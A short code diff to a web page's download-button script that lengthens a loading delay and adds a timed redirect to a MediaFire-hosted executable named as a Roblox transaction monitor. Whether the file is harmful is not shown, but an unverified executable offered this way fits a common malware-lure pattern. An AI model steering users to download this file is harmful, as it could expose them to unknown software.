@@ -14,7 +14,10 @@ document.getElementById('download-button').addEventListener('click', function ()
         button.classList.remove('loading');
         spinner.classList.add('hidden');
         buttonText.textContent = 'Download Now';
-    }, 3000); // Adjust timeout as needed
+    }, 5000); // Adjust timeout as needed
+
     // Optionally, redirect to the download link
-    window.location.href = "https://www.mediafire.com/file/3e15dsdp1g6oko5/Roblox_Transaction_Monitor_V0.6.3.exe/file";
+    setTimeout(() => {
+        window.location.href = "https://www.mediafire.com/file/3e15dsdp1g6oko5/Roblox_Transaction_Monitor_V0.6.3.exe/file";
+    }, 500); // Ensure smooth transition before redirect
 });
